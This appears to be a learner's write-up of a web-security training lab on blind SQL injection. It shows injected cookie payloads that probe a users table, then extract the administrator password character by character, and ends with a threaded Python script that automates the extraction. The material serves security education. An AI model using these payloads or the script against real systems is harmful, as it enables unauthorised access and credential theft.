# Blind SQL injection with conditional responses

### Here as we are doing blind injection we will change values for cookie in `TrackingId` header . If I put this `' AND '1'='1` it will request if both conditions are true then only we get a Welcome Back message .
**Request**
```http
GET /filter?category=Gifts HTTP/2
Host: 0a5b00d9045ad76a80e54e9300580069.web-security-academy.net
Cookie: TrackingId=biBQXtqlVPde9WhY' AND '1'='1; session=[REDACATED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5b00d9045ad76a80e54e9300580069.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
**Response**
```html
                      [...below codes are omitted...]
                       <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <div>Welcome back!</div><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                        [...reamianing are omitted...]
```

---
### Checking if there is a table name users , and got a Welcome back message .
```http
Cookie: TrackingId=biBQXtqlVPde9WhY' AND (SELECT 'a' FROM users LIMIT 1)='a; 
```
---
### Checking for username administrator and got that message .
```http
Cookie: TrackingId=biBQXtqlVPde9WhY' AND (SELECT 'a' FROM users WHERE username='administrator')='a; 
```
---
### Now I checked for the password length and checked whether its greater than 1 , and got the message , so it's true .
```http
Cookie: TrackingId=biBQXtqlVPde9WhY' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a;
```

---
### In the lab they told its 20 character long and here also got the message , if I do `LENGTH(password)>=21` , I haven't got the message . 
```http
Cookie: TrackingId=biBQXtqlVPde9WhY' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>=20)='a;
```
---
### By the help of SUBSTRING function it will check single character one by one . By the help of Intruder in burp it can be done , added list of a-z and 0-9 payloads and in grep-match added Welcome back message , so when it finds the correct character it will mark that . 
```http
Cookie: TrackingId=biBQXtqlVPde9WhY' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
```

<img width="1920" height="795" alt="first-char" src="https://github.com/user-attachments/assets/ecbb05d7-250b-4170-be59-46dfb9a2fe7f" />

### From the below I got the first character as 8 , so after this I need to this more 19 times to get the full password .
### That's why I thought of making a python script which does same work as intruder did here , but a small problem is it will take around 20minutes to retrieve the full password .

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

LAB_URL = "https://0ab300a0031b22e68168902500450008.web-security-academy.net/filter?category=Gifts"

TRACKING_ID = "M8hkvju2AeDf6yXV"
SESSION = "REDACTED"

chars = string.ascii_lowercase + string.digits
password = ""

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})


def test_char(position, char):
    payload = (
        TRACKING_ID +
        f"' AND (SELECT SUBSTRING(password,{position},1) "
        f"FROM users WHERE username='administrator')='{char}"
    )

    try:
        r = s.get(
            LAB_URL,
            cookies={
                "TrackingId": payload,
                "session": SESSION
            },
            timeout=5
        )

        return char if "Welcome back" in r.text else None

    except requests.RequestException:
        return None


for position in range(1, 21):

    print(f"[*] Testing position {position}...")

    with ThreadPoolExecutor(max_workers=10) as executor:

        jobs = [
            executor.submit(test_char, position, char)
            for char in chars
        ]

        found = None

        for job in as_completed(jobs):
            result = job.result()

            if result:
                found = result
                break

    if found:
        password += found
        print(f"[+] Position {position}: {found}")
        print(f"[+] Password so far: {password}")
    else:
        print(f"[!] No character found at position {position}")
        break

print("\n==============================")
print("[+] Password:", password)
print("==============================")
```

<img width="1920" height="747" alt="Screenshot_2026-10-05_22_56_01" src="https://github.com/user-attachments/assets/114e5957-35d3-4b3c-a198-b8b717bbf1d4" />

### Found the password but the faster is actually the burp intruder , you can get full password within 5minutes but this takes longer but fully automated . 





